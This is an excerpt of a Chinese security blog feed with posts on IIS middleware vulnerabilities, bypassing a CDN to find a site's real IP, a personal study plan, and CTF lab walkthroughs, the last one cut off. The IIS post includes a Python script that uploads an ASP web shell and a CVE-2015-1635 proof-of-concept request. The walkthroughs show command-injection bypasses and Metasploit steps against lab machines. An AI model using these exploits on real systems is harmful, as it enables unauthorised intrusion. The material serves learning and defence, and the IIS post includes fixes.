<li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
</li>
<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件漏洞之IIS（记录）</title>
    <url>/2020/04/03/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BIIS%EF%BC%88%E8%AE%B0%E5%BD%95%EF%BC%89/</url>
    <content><![CDATA[<p>中间件IIS常见漏洞记录<a id="more"></a></p>
<h1 id="中间件和IIS简介："><a href="#中间件和IIS简介：" class="headerlink" title="中间件和IIS简介："></a>中间件和IIS简介：</h1><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><blockquote>
<p>中间件是一类连接软件组件和应用的计算机软件，它包括一组服务。以便于运行在一台或多台机器上的多个软件通过网络进行交互。</p>
</blockquote>
<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><blockquote>
<p>是互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。</p>
</blockquote>
<blockquote>
<p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p>
</blockquote>
<p><img src="https://i.imgur.com/Ez6miVp.png" alt=""></p>
<h1 id="IIS常见漏洞整理："><a href="#IIS常见漏洞整理：" class="headerlink" title="IIS常见漏洞整理："></a>IIS常见漏洞整理：</h1><p><img src="https://i.imgur.com/EUNJrSy.png" alt=""></p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h3><p>1、默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析<br><img src="https://i.imgur.com/PlXlJmO.png" alt=""></p>
<p>2、默认会将 *.asp/目录下的所有文件当成Asp解析<br><img src="https://i.imgur.com/0q5nUps.png" alt=""></p>
<p>3、将扩展名为.asa，.cdx，.cer解析为asp<br><img src="https://i.imgur.com/egAugqC.png" alt=""></p>
<p><em>修复建议：</em></p>
<p>1、设置上传目录的执行权限，不允许执行脚本。</p>
<p>2、对上传的文件进行随机重命名，并且去除文件名回显。</p>
<h3 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h3><p><em>安装IIS7.5</em></p>
<p>1、安装应用程序开发功能<br><img src="https://i.imgur.com/vZRkNTV.png" alt=""></p>
<p>2、下载<a href="http://museum.php.net/php5/php-5.2.10-win32-installer.msi" target="_blank" rel="noopener">php-5.2.10-win32-installer.msi</a></p>
<p>-&gt; 安装：一直下一步直到web server setup，选择选择IIS fastcgi</p>
<p><img src="https://i.imgur.com/EEBjDks.png" alt=""></p>
<p>3、编辑：ISAPI或者CGI限制</p>
<p><img src="https://i.imgur.com/yL8oBRx.png" alt=""></p>
<p>-&gt;添加</p>
<p><img src="https://i.imgur.com/SVHPoDm.png" alt=""></p>
<p>4、编辑：处理程序映射</p>
<p><img src="https://i.imgur.com/6Ec0Ega.png" alt=""></p>
<p>-&gt;添加</p>
<p><img src="https://i.imgur.com/Chb4C5I.png" alt=""></p>
<p>5、测试phpinfo</p>
<p><img src="https://i.imgur.com/Qw4zTSH.png" alt=""></p>
<p><em>利用：</em></p>
<p>1、Fast-CGI运行模式下,在任意文件。</p>
<p>例：test.jpg后面加上/.php，会将test.jpg 解析为php文件<br><img src="https://i.imgur.com/xMH6gRM.png" alt=""></p>
<p><em>修复建议：</em></p>
<p>1、修改php.ini</p>
<pre><code>; cgi.fix_pathinfo=0
//修改之前为：; cgi.fix_pathinfo=1</code></pre><h2 id="PUT任意文件写入"><a href="#PUT任意文件写入" class="headerlink" title="PUT任意文件写入"></a>PUT任意文件写入</h2><p>1、影响版本：6.x</p>
<p>开启WebDAV和写权限</p>
<p><img src="https://i.imgur.com/c7GAOr7.png" alt=""></p>
<p><img src="https://i.imgur.com/fQsW7n3.png" alt=""></p>
<p><img src="https://i.imgur.com/CqFbgQb.png" alt=""></p>
<p><img src="https://i.imgur.com/LD0DNVf.png" alt=""></p>
<p>2、EXP</p>
<pre><code>#!/usr/bin/env python
# -*- coding:utf-8 -*-
#需要运行两次，第一次上传shell.txt。第二次用move方法。
import requests

# 分别需要put,move的url（在这里修改url）
put_url = &apos;http://192.168.1.133/shell.txt&apos;
move_url = &apos;http://192.168.1.133/shell.txt&apos;
move_headers = {
    &apos;Destination&apos;: &apos;http://192.168.1.133/shell.asp&apos;
}
# put的脚本（这里修改password）
put_data = &apos;&lt;%execute(request(&quot;passwd&quot;))%&gt;&apos;
post_data = {
    &apos;apple&apos;: &apos;&apos;
}
try:
    response = requests.request(&apos;PUT&apos;, url=put_url, data=put_data)
    if response.status_code == 200:
        response = requests.request(&apos;MOVE&apos;, url=move_url, headers=move_headers)
        if response.status_code == 207:
            response = requests.post(url=&apos;http://192.168.1.133/shell.asp&apos;, data=post_data)
            print(response.content.decode(&quot;gb2312&quot;))
        else:
            print(response.status_code)
except:
    pass</code></pre><p><a href="https://www.codercto.com/a/48257.html" target="_blank" rel="noopener" title="https://www.codercto.com/a/48257.html">https://www.codercto.com/a/48257.html</a></p>
<p><em>修复建议：</em></p>
<p>关闭WebDAV 和 写权限</p>
<h2 id="短文件漏洞"><a href="#短文件漏洞" class="headerlink" title="短文件漏洞"></a>短文件漏洞</h2><p>1、影响条件：NTFS 8.3支持开启</p>
<p>原理：在cmd中输入 dir\x 查看短文件名，可以看到存在的文件返回404，不存在返回400</p>
<p><img src="https://i.imgur.com/WocqQJp.png" alt=""></p>
<p><img src="https://i.imgur.com/tsS1GEo.png" alt=""></p>
<p>2、EXP：<a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener" title="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></p>
<p>3、参考：<br><a href="https://www.freebuf.com/news/197144.html" target="_blank" rel="noopener" title="https://www.freebuf.com/news/197144.html">https://www.freebuf.com/news/197144.html</a></p>
<p><em>修复建议：</em></p>
<pre><code>#1、关闭NTFS 8.3支持（1关闭，0开启）
fsutil behavior set disable8dot3 1
#2、修改注册表regedit
找到路径HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，修改NtfsDisable8dot3NameCreation为1
#重启系统生效</code></pre><h2 id="HTTP-sys远程代码执行（CVE-2015-1635）"><a href="#HTTP-sys远程代码执行（CVE-2015-1635）" class="headerlink" title="HTTP.sys远程代码执行（CVE-2015-1635）"></a>HTTP.sys远程代码执行（CVE-2015-1635）</h2><p>1、影响范围：<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</p>
<p>2、POC:</p>
<pre><code>curl http://192.168.1.144 -H &quot;Host: 192.168.1.144&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;</code></pre><p><img src="https://i.imgur.com/KBgHuw6.png" alt=""></p>
<p>2、MSF_POC：</p>
<p><a href="https://www.cvedetails.com/cve/CVE-2015-1635/" target="_blank" rel="noopener" title="https://www.cvedetails.com/cve/CVE-2015-1635/">https://www.cvedetails.com/cve/CVE-2015-1635/</a></p>
<p><img src="https://i.imgur.com/lEiChUW.png" alt=""></p>
<p><img src="https://i.imgur.com/AzLmd9v.png" alt=""></p>
<p><img src="https://i.imgur.com/Mtj15Zc.png" alt=""></p>
<p>3、参考：</p>
<p><a href="https://www.freebuf.com/vuls/64195.html" target="_blank" rel="noopener" title="https://www.freebuf.com/vuls/64195.html">https://www.freebuf.com/vuls/64195.html</a></p>
<h2 id="远程代码执行（CVE-2017-7269）"><a href="#远程代码执行（CVE-2017-7269）" class="headerlink" title="远程代码执行（CVE-2017-7269）"></a>远程代码执行（CVE-2017-7269）</h2><p>1、影响范围：</p>
<p>在Windows 2003 R2, Enterprise Edition Service Pack 2）上使用IIS 6.0并开启WebDAV扩展。</p>
<p>2、EXP:</p>
<p><a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener" title="https://github.com/zcgonvh/cve-2017-7269">https://github.com/zcgonvh/cve-2017-7269</a>（msf自带的只能适用于默认物理路径）</p>
<p>在载入完上面的exp后，值得注意的是physicalpathlength的值</p>
<p>例如：我的物理路径为C:\Inetpub\wwwroot\aspcms（需要加上\）长度就为26</p>
<p><img src="https://i.imgur.com/iUrYGkH.png" alt=""></p>
<p>3、参考：<br><a href="http://www.admintony.com/CVE-2017-7269.html" target="_blank" rel="noopener" title="http://www.admintony.com/CVE-2017-7269.html">http://www.admintony.com/CVE-2017-7269.html</a></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="CGI环境块伪造"><a href="#CGI环境块伪造" class="headerlink" title="CGI环境块伪造"></a>CGI环境块伪造</h3><p>1、影响版本：IIS4、IIS5 &amp;&amp;winnt、Win2000</p>
<p>2、参考：<a href="https://www.freebuf.com/vuls/31444.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/31444.html</a></p>
<h3 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h3><p>1、影响版本：IIS6.0、IIS7.5</p>
<p>2、漏洞详情：对用户输入未经正确验证，攻击者可利用漏洞构造特殊数据，在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问</p>
<p>3、攻击手段：</p>
<p>IIS6.0:<br>将::$INDEX_ALLOCATION后缀添加到目录名称后，如/admin::$INDEX_ALLOCATION/index.php</p>
<p>IIS7.5:<br>将:$i30:$INDEX_ALLOCATION后缀添加到目录名称后，如/admin:$i30:$INDEX_ALLOCATION/index.asp</p>
<h3 id="FTPd服务MLST命令栈缓冲区溢出漏洞"><a href="#FTPd服务MLST命令栈缓冲区溢出漏洞" class="headerlink" title="FTPd服务MLST命令栈缓冲区溢出漏洞"></a>FTPd服务MLST命令栈缓冲区溢出漏洞</h3><p>1、MSF_POC</p>
<ul>
<li>MS09-053/CVE-2009-3023</li>
</ul>
<h3 id="拒绝服务漏洞"><a href="#拒绝服务漏洞" class="headerlink" title="拒绝服务漏洞"></a>拒绝服务漏洞</h3><ul>
<li><p>CVE-2019-0941</p>
</li>
<li><p>CVE-2019-9512</p>
</li>
<li><p>等等……</p>
</li>
</ul>
<h2 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h2><p>在收集完IIS的漏洞之后，感觉都很简单，但是发现实际复现的时候还是遇到了一些状况特别是CVE-2017-7269，在复现的过程中就因为系统的版本、以及EXP本身的问题，这个漏洞有很多EXP但是，并不是每个版本都可以利用成功，有一些细微差别。总体，虽然都是一些比较旧的漏洞，也很难遇到，但是还是有一些收获。</p>
<hr>
<p><strong>声明：</strong></p>
<ul>
<li><p>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</p>
</li>
<li><p>本文属于<a href="https://aqyoung.github.io/" title="https://aqyoung.github.io/">@ayoung博客</a>，未经许可禁止转载：</p>
</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过CDN查找真实IP方法总结</title>
    <url>/2020/03/30/CDN_bypass1/</url>
    <content><![CDATA[<p>绕过CDN查找真实IP地址的总结文章<a id="more"></a></p>
<h1 id="什么是CDN有哪些影响？"><a href="#什么是CDN有哪些影响？" class="headerlink" title="什么是CDN有哪些影响？"></a>什么是CDN有哪些影响？</h1><blockquote>
<p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p>
</blockquote>
<p>简单来讲：CDN可以被形象的称为“网络加速器”，那么在渗透测试过程中如果目标网站有使用CDN技术的话，那么你访问的是一个缓存，会导致一些操作难以进行。所以就需要学习我们绕过CDN的方法。</p>
<hr>
<h1 id="如何检测目标是否存在CDN"><a href="#如何检测目标是否存在CDN" class="headerlink" title="如何检测目标是否存在CDN"></a>如何检测目标是否存在CDN</h1><ul>
<li>超级ping</li>
</ul>
<p>网上有很多超级提供超级ping服务的厂商，我们可以通过判断“响应IP”是否一致确定有无使用CDN，一致则没有使用CDN；反之使用了CDN。</p>
<p><img src="https://i.imgur.com/KMRzVVz.png" alt=""></p>
<ul>
<li>nslookup</li>
</ul>
<p>利用电脑自带的nslookup也可以简单的判断，判断方法和上面一致（注意第一次使用后会留下缓存，所以只有一个address）</p>
<p><img src="https://i.imgur.com/ppmtsFX.png" alt=""></p>
<hr>
<h1 id="CDN绕过方法"><a href="#CDN绕过方法" class="headerlink" title="CDN绕过方法"></a>CDN绕过方法</h1><p><img src="https://i.imgur.com/FAltFsb.png" alt=""></p>
<h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h2><ul>
<li><p>原理：因为使用CDN是需要费用的，所以一般公司可能不会让所有的子域名都使用CDN，一般访问量较少的可能没有使用CDN。那么那个子域名的ip就有可能是目标站点的真实IP了。</p>
</li>
<li><p>关于子域名的查询方法有很多。</p>
<p>  这里推荐一款network scraping工具”amass”集成了DNS、证书、各种API、网页档案；<br>  至于bruteforcer可以使用的工具也有很多，Layer、Massdns等。效果取决于你字典的质量。</p>
</li>
</ul>
<h2 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h2><ul>
<li>原理：顾名思义是使用，国外的IP地址去访问目标地址。一些偏远的地区可能没有CDN服务，那么就会直接去访问真实IP了。</li>
<li>使用：<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a>（如果自己有IP资源可以）<br><img src="https://i.imgur.com/5DAjqnS.png" alt=""></li>
</ul>
<h2 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h2><ul>
<li>原理：通过各种方式，让对方给你发送邮件。注册验证码、社工、等等。</li>
<li>这里以qq邮箱为例：只需要点查看邮件原文，关注Received即可。</li>
</ul>
<p><img src="https://i.imgur.com/iP9sagY.png" alt=""></p>
<p><img src="https://i.imgur.com/OoLl7N9.png" alt=""></p>
<h2 id="网络搜索引擎"><a href="#网络搜索引擎" class="headerlink" title="网络搜索引擎"></a>网络搜索引擎</h2><ul>
<li><p>原理：这里主要是利用网站返回的内容寻找真实原始IP，如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。</p>
</li>
<li><p>方法1 空间搜索：</p>
<ul>
<li>查看网页源代码，寻找特征码片段。</li>
<li>搜索title，如shodan可以直接用title=”xxx”来搜索，当然也可以使用其他第三方服务（百度统计，google统计的特征码等等。）<br><img src="https://i.imgur.com/rxSeefe.png" alt=""></li>
</ul>
</li>
<li><p>方法2 Censys证书查询搜索：</p>
<ul>
<li><p>1、aaa.com 证书的搜索查询参数为：parsed.names：xxx.com</p>
</li>
<li><p>只显示有效证书的查询参数为：tags.raw：trusted</p>
</li>
<li><p>2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted</p>
</li>
<li><p>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的“Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；<br><img src="https://i.imgur.com/cODmmOG.png" alt=""><br>然后可以用下面这一段jQuery代码批量提取IP</p>
<p>$(‘span.ip a’).each(function(n,e){console.log($(e).prop(“href”).split(“v4/“)[1])})</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://i.imgur.com/ciIrHcN.png" alt=""></p>
<h2 id="dns历史记录"><a href="#dns历史记录" class="headerlink" title="dns历史记录"></a>dns历史记录</h2><ul>
<li>原理：<br>通过查找历史解析的IP，可能是他没上CDN之前的真实ip<ul>
<li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a></li>
<li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li>
<li><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a></li>
<li><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a></li>
</ul>
</li>
</ul>
<p>在某些情况下，找到的IP的服务器返回默认索引页或404、403 HTTP代码等。</p>
<p>那么，在这种情况下，可以尝试修改电脑的hosts文件。再用下面代码进行验证。</p>
<pre><code>curl -H &quot;Host: www.xx.com&quot; https://xxx.168.1.xxx -k</code></pre><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><pre><code>查看phpinfo文件的SERVER_ADDR</code></pre><p><img src="https://i.imgur.com/jpSE1DO.png" alt=""></p>
<h3 id="扫全网"><a href="#扫全网" class="headerlink" title="扫全网"></a>扫全网</h3><p>通过扫描全网开放特定端口的IP，最终匹配具有相同HTTP banner的，再进行筛选</p>
<pre><code># masscan 10.0.0.0/8 -p80 --banners --source-ip 192.168.1.200</code></pre><p>这条命令的意思是扫描10.x.x.x网段80端口的开放信息，并且获取banner信息。–source-ip 是指定源IP，这个ip必须指定独立有效的IP地址。</p>
<p>这个时候你还可能获取不到banners的信息，需要配置防火墙。可以参考这篇文章：</p>
<p><a href="https://my.oschina.net/799835984/blog/663361" target="_blank" rel="noopener" title="Linux配置防火墙详细步骤（iptables命令使用） ">https://my.oschina.net/799835984/blog/663361</a></p>
<h3 id="消耗CDN"><a href="#消耗CDN" class="headerlink" title="消耗CDN"></a>消耗CDN</h3><p>一般来说CDN是有流量限制的，如果你使用了DOS攻击等消耗了资源，那么就会访问到真实IP了，但此方法代价较大，极不推荐使用。</p>
<h3 id="JS泄露"><a href="#JS泄露" class="headerlink" title="JS泄露"></a>JS泄露</h3><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">https://github.com/boy-hack/w8fuckcdn</a></p>
<hr>
<p>此文章仅用于网络安全交流，请勿将其用于其他非法目的！</p>
<p><strong>本文属于@ayoung博客，未经许可禁止转载</strong></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-03-27</title>
    <url>/2020/03/27/2020-03-27/</url>
    <content><![CDATA[<h2 id="2020年计划"><a href="#2020年计划" class="headerlink" title="2020年计划"></a>2020年计划<a id="more"></a></h2><h1 id="19年"><a href="#19年" class="headerlink" title="19年"></a>19年</h1><p>2019年是我接触渗透测试的元年，严格来说：只是我开始学习渗透知识的一年，并不算是真正接触渗透测试，在这一年期间我做了这么几件事情:<br><img src="/images/2020/19%E5%B9%B4.png" alt=""></p>
<pre><code>1.学习常见的“web漏洞”：利用sqlmap挖掘注入漏洞进入后台、利用&quot;auth&quot;存在逻辑缺陷bypass从而造成越权的危害等等...
2.学习kali linux和常见的渗透工具：**常见的cve漏洞ms08067拿反弹shell；学习后渗透、域渗透、提权等；
工具MSF、Nessus、netcat、nmap、burpsuit等等，工具真的太多了，后来发现就算你把kali所有的工具
学个遍你也不会成为大佬，但这都是基础。
3.再后来我发现学完这些，挖洞的效率低，于是乎：我又去学了Python，从基础语法到Python核心编程；
学习爬虫、学习各种库、os、datatime、sys、socket、thereading、xml、xpath、request、re等等；
尽管学完这些、爬虫效率总是不尽人意于是乎又写了scrapy框架、学习twisted异步操作数据库、
用爬取的内容存入数据库，用到的时候随时取出。
4.linux的使用频率随着我学到的东西越来越多，也会用的更加频繁，如此的工作量存在一定的重复性怎么办、
bash编程无疑是一个好的解决方案：于是乎我又去学习了bash编程，利用bash编程将一切可以工程化的工作自动完成。</code></pre><p>学了一年我总算是了解了渗透测试的一些皮毛，在一年我兴奋过、疑惑过、甚至想放弃过。也曾怀疑过自己也许不适合这个行业，但是当我后来当我回过头来看时，我也确实增加了很多技能点，这总比躺着好吧！即使没有天赋。</p>
<pre><code>这里引用“余玄”大佬的一句话：</code></pre><blockquote>
<p>“我眼中的 Python、大数据、产品、项目、运营、营销、黑客等等等，都是一种技能而已，没什么特别，你也可以掌握，它们就在那，就像玩孢子游戏一样，你要足够大才能吃掉那些比你小的，而你还不够大时，却盲目贪婪，小心你自己被吃掉。”</p>
</blockquote>
<p>这句话让我感触颇深，确实这些东西在一个黑客眼中都只是一种技能而已，我反问自己我所学到的技能，需要完全掌握的技能点，我真的掌握了吗？<br><strong>不，我没有！</strong></p>
<hr>
<h1 id="20年"><a href="#20年" class="headerlink" title="20年"></a>20年</h1><p>2020年我的计划很简单，因为”当你还不够大时，却盲目贪婪，小心你自己被吃掉“ （同时这个计划会随着我的学习完成情况不断的更新调整）<br><img src="/images/2020/20%E5%B9%B4.png" alt=""></p>
<p>学习方向：</p>
<pre><code>1.web渗透：（提高手工挖漏洞的能力）在web渗透方面我知道自己的实力，是处在一个“有一定基础但是缺少经验和火候”
所以我的目标很明确：通过不断挖掘SRC、总结自己的挖洞思路、和大佬讨论思路、不断整理归纳漏洞（放到Blog）提高自己的实力。
2.学习二进制（逆向）：web是一个大方向，都说web和二进制不分家，但是我却没有体会直到前段时间我去面试某实验室的岗位
面试官：问我二进制怎么样？
我说：了解一些基础（此时内心十分忐忑）
我深深意识到了如果：作为一个安全研究员，即使你是一个web狗没有做过二进制漏洞的分析，但是该你上的时候就得上。
3.继续学习python自动化渗透：争取开发出一款真正属于自己的安全工具。</code></pre><p>书籍：</p>
<pre><code>《Linux环境编程：从应用到内核》
《Python核心编程（第3版）》
《Python灰帽子：黑客与逆向工程师的Python编程之道》
《白帽子讲Web安全》</code></pre>]]></content>
      <categories>
        <category>MyPlan</category>
      </categories>
  </entry>
  <entry>
    <title>CTF- 靶场夺旗</title>
    <url>/2019/12/15/CTF-%E9%9D%B6%E5%9C%BA%E5%A4%BA%E6%97%97/</url>
    <content><![CDATA[<h2 id="一、CTF介绍"><a href="#一、CTF介绍" class="headerlink" title="一、CTF介绍"></a>一、CTF介绍</h2><p>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。<a id="more"></a>其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。</p>
<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux（192.168.0.4）桥接模式<br>靶机：192.168.0.100 桥接模式</p>
<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测</strong><br>扫描主机开放的端口号</p>
<ul>
<li>nmap -p- -T4 靶场lP地址<br><img src="/images/ctf/ctf1.png" alt=""></li>
</ul>
<p>快速扫描主机全部信息</p>
<ul>
<li>nmap -T4 -A -v 靶场lP地址<br><img src="/images/ctf/ctf2.png" alt=""><br><img src="/images/ctf/ctf3.png" alt=""></li>
</ul>
<p>探测敏感信息</p>
<ul>
<li><p>nikto -host http://靶场lP地址：端口<br><img src="/images/ctf/ctf4.png" alt=""><br><img src="/images/ctf/ctf5.png" alt=""></p>
</li>
<li><p>dirb http://靶场lP地址：端口<br><img src="/images/ctf/ctf6.png" alt=""><br><img src="/images/ctf/ctf7.png" alt=""></p>
</li>
</ul>
<p><strong>2、深入挖掘</strong><br>分析nmap、nikto扫描结果，挖掘可以利用的信息；</p>
<p>对于大端口非http服务，可以使用nc来探测该端口的banner信息；</p>
<ul>
<li>nc ip地址 端口号<br><img src="/images/ctf/ctf8.png" alt=""><br><em>根据分析，我们可以得到13337和60000应该是非http服务</em><br><img src="/images/ctf/ctf9.png" alt=""></li>
</ul>
<p>对于大端口http服务，可以使用浏览器浏览界面查看源代码，寻找lag值；<br><img src="/images/ctf/ctf10.png" alt=""><br><em>根据分析，可以得到80和9090是http服务，于是我们用浏览器尝试打开</em></p>
<ul>
<li><a href="http://ip地址：端口号" target="_blank" rel="noopener">http://ip地址：端口号</a><br><img src="/images/ctf/ctf11.png" alt=""><br><em>又发现一个flag值</em></li>
</ul>
<p><strong>3、更深入挖掘</strong><br>FTP 匿名登录挖掘敏感信息；<br><img src="/images/ctf/ctf12.png" alt=""><br><em>由之前的nmap扫描中发现，存在ftp服务，并且可以匿名登陆</em><br>在浏览器中输入ftp://靶场lP地址 匿名登录tp服务器根目录，查看敏感文件，注意一定要查看源代码；<br><img src="/images/ctf/ctf13.png" alt=""></p>
<p>发现robots.txt文件<br><img src="/images/ctf/ctf14.png" alt=""></p>
<ul>
<li>在站点robots.txt文件中寻找敏感文件，挖掘敏感文件漏洞；<br><img src="/images/ctf/ctf16.png" alt=""></li>
</ul>
<p><img src="/images/ctf/ctf17.png" alt=""><br><img src="/images/ctf/ctf18.png" alt=""><br><img src="/images/ctf/ctf19.png" alt=""><br><em>打开三个目录后发现 <a href="http://192.168.0.10/cgi-bin/tracertool.cgi这个URL存在交互，于是进行下一步测试" target="_blank" rel="noopener">http://192.168.0.10/cgi-bin/tracertool.cgi这个URL存在交互，于是进行下一步测试</a></em><br><img src="/images/ctf/ctf20.png" alt=""><br><img src="/images/ctf/ctf21.png" alt=""><br>果然存在命令执行的漏洞，于是尝试打开/etc/passwd文件<br>但是cat打不开，应该是被过滤了<br>对于命令执行中，为了绕过对应的限制，可以使用相近命令来代替限制的shell命令<br>如cat more<br><img src="/images/ctf/ctf22.png" alt=""><br><img src="/images/ctf/ctf23.png" alt=""><br><em>由于之前提示我们Morty的用户的密码可能无法破解，于是我们重点放在Summer账户</em></p>
<p><strong>4、登录靶场机器</strong><br>获得对应的用户名和密码之后，可以通过ssh来登录系统，查看对应的lag值<br><img src="/images/ctf/ctf24.png" alt=""><br><em>这里22端口被拒绝连接了</em><br><img src="/images/ctf/ctf25.png" alt=""><br>分析之前的端口：22222可能可以登录<br>ssh-p port 用户名@靶场lP地址<br><img src="/images/ctf/ctf26.png" alt=""><br><em>无奈尝试弱密码失败</em><br>这个时候想起之前的在查看源码，发现了一个password<br><img src="/images/ctf/ctf27.png" alt=""><br>之后输入对应的密码登录系统<br><img src="/images/ctf/ctf28.png" alt=""><br>pwd Is cat more<br>执行命令查看flag值<br><img src="/images/ctf/ctf29.png" alt=""></p>
<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>注意未知服务的端口，可以使用nc获取对应的banner信息；<br>使用对应相近的shell命令来绕过限制；如cat more<br>对每一个服务都需要进行对应的探测，不放过任何一个可以利用的点</p>
]]></content>
      <categories>
        <category>CTF夺旗训练</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-FTP服务后门利用</title>
    <url>/2019/12/14/CTF-FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="一、FTP介绍"><a href="#一、FTP介绍" class="headerlink" title="一、FTP介绍"></a>一、FTP介绍</h2><p>FTP是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。<a id="more"></a>同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念：“下载” (Download)和“上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机上，“上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。</p>
<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>攻击机：kali linux 192.168.43.153<br>靶场机器：192.168.43.138</p>
<h2 id="三、实验过程"><a href="#三、实验过程" class="headerlink" title="三、实验过程"></a>三、实验过程</h2><p><strong>1、信息探测</strong><br>扫描主机服务信息以及服务版本<br>nmap -sV靶场lP地址<br><img src="/images/ftp/ftp1.png" alt=""></p>
<p>快速扫描主机全部信息<br>nmap-T4-A-v靶场lP地址<br><img src="/images/ftp/ftp2.png" alt=""></p>
<p><strong>2、发现漏洞</strong><br>分析nmap扫描结果，并对结果进行分析，挖掘可以利用的信息；<br><img src="/images/ftp/ftp3.png" alt=""><br>使用seachsploit，查看漏洞信息，找到可利用的溢出代码；<br><img src="/images/ftp/ftp4.png" alt=""></p>
<p><strong>3、使用metasploit进行溢出</strong><br>打开Metasploit 在终端中输入msfconsole<br>输入search对应的软件及版本号</p>
<p>使用exploit<br>-use exploit<br><img src="/images/ftp/ftp5.png" alt=""></p>
<p>查看可以使用的payload<br>-show payload<br><img src="/images/ftp/ftp6.png" alt=""></p>
<p>设置payload<br>–set payload<br><img src="/images/ftp/ftp7.png" alt=""></p>
<p>设置参数<br>–show options<br>-set rhost 靶场lP<br>-set lhost 靶场lP</p>
